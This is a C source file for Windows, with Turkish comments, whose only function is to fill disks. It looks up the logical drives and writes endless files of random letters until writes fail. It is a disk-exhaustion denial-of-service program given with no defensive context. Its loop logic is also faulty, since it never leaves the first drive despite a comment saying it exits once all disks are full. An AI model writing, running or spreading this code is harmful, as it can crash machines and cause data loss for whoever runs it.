#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <process.h>
#include <shlobj.h>

#define BUFFER_SIZE 1024 * 1024 // 1 MB buffer size

void createTextFileWithRandomData(const char* filename) {
    FILE* fp;
    if (fopen_s(&fp, filename, "wb") == 0) {
        char* buffer = (char*)malloc(BUFFER_SIZE);

        if (buffer != NULL) {
            for (size_t i = 0; i < BUFFER_SIZE; i++) {
                buffer[i] = 'A' + rand() % 26;
            }

            while (1) {
                if (fwrite(buffer, sizeof(char), BUFFER_SIZE, fp) != BUFFER_SIZE) {
                    break; // Dosya yazma işlemi başarısız olduğunda döngüden çık
                }
            }

            free(buffer);
        }
        else {
            printf("Failed to allocate memory for buffer.\n");
        }

        fclose(fp);
        printf("File created: %s\n", filename);
    }
    else {
        printf("Failed to create file: %s\n", filename);
    }
}

void createFilesInDirectory(const char* directoryPath) {
    char filename[30];
    int fileCount = 1;
    while (1) {
        sprintf_s(filename, sizeof(filename), "%s\\full%d.txt", directoryPath, fileCount);
        createTextFileWithRandomData(filename);
        fileCount++;
    }
}

unsigned __stdcall createFiles(void* arg) {
    DWORD drives = GetLogicalDrives();
    DWORD mask = 1;

    for (char drive = 'A'; drive <= 'Z'; drive++) {
        if (drives & mask) {
            char drivePath[4];
            sprintf_s(drivePath, sizeof(drivePath), "%c:\\", drive);

            createFilesInDirectory(drivePath);
        }
        mask <<= 1;
    }

    free(arg);

    // Bütün diskler dolduğunda programı sonlandır
    exit(0);

    return 0;
}

int main() {
    HANDLE thread = NULL;

    int* threadData = (int*)malloc(sizeof(int));
    if (threadData != NULL) {
        *threadData = 0;
        thread = (HANDLE)_beginthreadex(NULL, 0, createFiles, threadData, 0, NULL);
        if (thread == NULL) {
            printf("Failed to create thread.\n");
            free(threadData);
        }
    }
    else {
        printf("Failed to allocate memory for thread data.\n");
    }

    if (thread != NULL) {
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
    }

    return 0;
}
